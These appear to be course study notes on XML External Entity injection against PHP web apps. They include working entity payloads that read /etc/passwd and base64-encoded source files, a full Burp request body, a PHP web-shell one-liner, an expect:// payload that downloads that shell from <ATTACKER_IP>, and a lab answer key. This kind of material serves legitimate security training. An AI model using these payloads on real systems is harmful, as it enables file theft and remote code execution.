## ID
530

## Module
Web Attacks

## Kind
notes

## Title
Section 14 — Local File Disclosure (XXE)

## Description
Exploiting XML External Entity (XXE) injection to read local files, source code (via PHP filters), and achieve remote code execution on vulnerable web applications.

## Tags
xxe, xml, lfi, php-filter, burp-suite, file-disclosure

## Commands
- `<!ENTITY company SYSTEM "file:///etc/passwd">`
- `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=<FILE>">`
- `<!ENTITY company SYSTEM "expect://id">`
- `echo '<?php system($_REQUEST["cmd"]);?>' > shell.php`
- `sudo python3 -m http.server 80`
- `<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'<ATTACKER_IP>/shell.php'">`

## What This Section Covers
XXE Local File Disclosure leverages improperly handled XML input to define external entities that reference server-side files. By injecting a custom DOCTYPE with a SYSTEM entity, an attacker can read sensitive files like `/etc/passwd`, SSH keys, or application source code. PHP's `php://filter` wrapper bypasses XML formatting issues by base64-encoding file contents before they're returned in the response.

## Methodology
1. Intercept the XML POST request in Burp Suite (ensure FoxyProxy is set to Burp on port 8080).
2. Identify which XML element's value is reflected in the response (e.g. `<email>`).
3. Test for XXE by injecting an internal entity: `<!ENTITY company "test">` and referencing it with `&company;` in the reflected element — if the value renders, the app is vulnerable.
4. Escalate to file read by switching to an external entity: `<!ENTITY company SYSTEM "file:///etc/passwd">`.
5. For PHP source code, use the base64 filter to avoid XML-breaking characters: `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=<TARGET_FILE>">`.
6. Decode the returned base64 string in Burp Inspector (double-click the string in the response pane).
7. For RCE (if `expect://` module is enabled), use `expect://` wrapper to execute commands, replacing spaces with `$IFS`.

## Multi-step Workflow (optional)
```
# 1. Full XXE payload to base64-read a PHP file (paste into Burp Repeater body)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
<root>
<name>test</name>
<tel>1234</tel>
<email>&company;</email>
<message>test</message>
</root>

# 2. Decode the base64 output
echo "<BASE64_STRING>" | base64 -d
```

## Lab — Questions & Answers (optional)
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Read connection.php api_key | UTM1NjM0MmRzJ2dmcTIzND0wMXJnZXdmc2RmCg | XXE with php://filter/convert.base64-encode → decoded in Burp Inspector |

## Key Takeaways
- Always check which XML element is reflected in the response — that's where you inject the entity reference.
- `file://` works for plain-text files but breaks on files containing XML special characters (`<`, `>`, `&`).
- `php://filter/convert.base64-encode` bypasses XML formatting issues by encoding the file before it enters the XML parser.
- JSON endpoints may also accept XML — try changing `Content-Type` to `application/xml` and converting the JSON body.
- The `expect://` RCE method requires the PHP expect module (rarely enabled on modern servers), so XXE is primarily a file disclosure attack.
- The Billion Laughs DoS payload (nested entity self-references) is mitigated by modern web servers like Apache.

## Gotchas (optional)
- If no element is reflected in the response, standard XXE won't show output — you need Blind/OOB XXE techniques (covered in later sections).
- Binary files cannot be read via XXE since they break XML format — use base64 encoding or stick to text files.
- When using `expect://` for RCE, spaces break XML syntax — replace them with `$IFS` and avoid `|`, `>`, `{` characters.
